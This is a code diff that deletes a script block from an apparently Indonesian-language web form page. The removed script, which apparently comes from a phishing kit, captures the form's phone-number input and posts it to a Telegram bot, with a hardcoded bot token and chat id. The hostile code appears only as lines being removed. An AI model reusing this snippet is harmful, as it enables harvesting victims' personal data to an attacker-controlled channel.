@@ -69,48 +69,7 @@ $( document ).ready(function() {
 
 
 
-<script>
- $(document).ready(function(){
-    $('#formHP').submit(function(e) {
-    event.preventDefault();
 
-
-    
-document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
-  $("#djload").show();
-
- $.ajax({
- type: 'POST',
- url: 'https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${nope}&parse_mode=html',
- data: $(this).serialize(),
- datatype: 'JSON',
- 
- complete: function(data) {
-            console.log('Complete')
-  setTimeout(function(){
-   $('#lodingku').hide();
-     window.location = "data.html";
-
-
-
-var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩 : ' + '0' + nope.value;
-
-var token = '6835147883:AAFmCIFxo_lG-iwUyIvegnjemiEoduvsKCc'; // Ganti dengan token bot yang kamu buat 
-var grup = '7142327444'; // Ganti dengan chat id dari bot yang kamu buat 
- var nomor = document.getElementById('nope').value;
-sessionStorage.setItem("nomor", nomor);
-     }, 500);
-    setTimeout(function(){  
-       $("#djload").hide();  
-       document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";    
-    }, 2000);
-        }
-    });
- });
-    return false;
-});   
-     
-</script>
 
 
 
